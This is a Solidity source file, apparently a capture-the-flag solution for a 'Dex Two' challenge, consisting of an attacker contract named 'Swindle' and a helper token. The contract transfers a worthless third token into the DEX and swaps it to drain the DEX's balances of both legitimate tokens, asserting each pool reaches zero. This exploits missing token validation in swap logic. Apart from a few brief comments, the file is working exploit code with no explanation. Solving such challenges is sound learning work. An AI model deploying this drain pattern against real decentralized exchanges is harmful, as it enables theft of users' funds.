// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract Swindle {
    DexTwo public dex2;
    ERC20 private immutable token1;
    ERC20 private immutable token2;
    ERC20 private immutable token3;

    constructor(address _dex2, address _token3) {
        dex2 = DexTwo(_dex2);
        token1 = ERC20(dex2.token1());
        token2 = ERC20(dex2.token2());
        token3 = ERC20(_token3);
    }

    // convenience function
    function getBalances() public view returns (uint[6] memory) {
        uint256[6] memory balances;
        balances[0] = dex2.balanceOf(address(token1), address(dex2));
        balances[1] = dex2.balanceOf(address(token1), msg.sender);
        balances[2] = dex2.balanceOf(address(token2), address(dex2));
        balances[3] = dex2.balanceOf(address(token2), msg.sender);
        balances[4] = token3.balanceOf(address(dex2));
        balances[5] = token3.balanceOf(msg.sender);
        return balances;
    }

    function approve() public {
        token3.approve(address(this), type(uint).max);
        dex2.approve(address(dex2), type(uint).max);
    }

    function Steeeaal() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);
        token3.transferFrom(msg.sender, address(dex2), 10);
        token3.transferFrom(msg.sender, address(this), 900);
        dex2.swap(address(token3), address(token1), 10); // after this dex token1 = 0;
        require(
            dex2.balanceOf(address(token1), address(dex2)) == 0,
            "token1 Still not zero"
        );
        dex2.swap(address(token3), address(token2), 5); // after this dex token2 = 0;
        require(
            dex2.balanceOf(address(token2), address(dex2)) == 0,
            "token2 Still not zero"
        );
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
